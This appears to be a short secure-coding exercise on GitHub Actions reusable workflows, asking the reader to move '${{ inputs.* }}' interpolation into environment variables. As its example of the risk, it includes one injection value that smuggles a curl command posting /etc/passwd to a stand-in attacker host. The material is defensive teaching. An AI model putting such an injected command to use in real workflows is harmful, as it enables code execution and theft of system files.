# Scenario: Reusable Workflow Injection

Your team created a reusable workflow for shared CI/CD tasks. It accepts `inputs` from caller workflows and uses them in `run:` steps via `${{ inputs.name }}` interpolation.

The problem: GitHub Actions substitutes `${{ inputs.* }}` BEFORE bash sees the command. If a caller passes a malicious value like:

```
name: "test"; curl https://evil.com/steal -d @/etc/passwd"
```

It becomes arbitrary code execution. Any repository in your org that calls this reusable workflow can exploit it.

**Your mission:** Refactor the reusable workflow to pass inputs through environment variables instead of direct expression interpolation.

## Key concepts
- `${{ inputs.x }}` is substituted pre-shell — injection risk
- `env: { VAR: ${{ inputs.x }} }` followed by `$VAR` in shell — safe
- Environment variables are not subject to shell injection
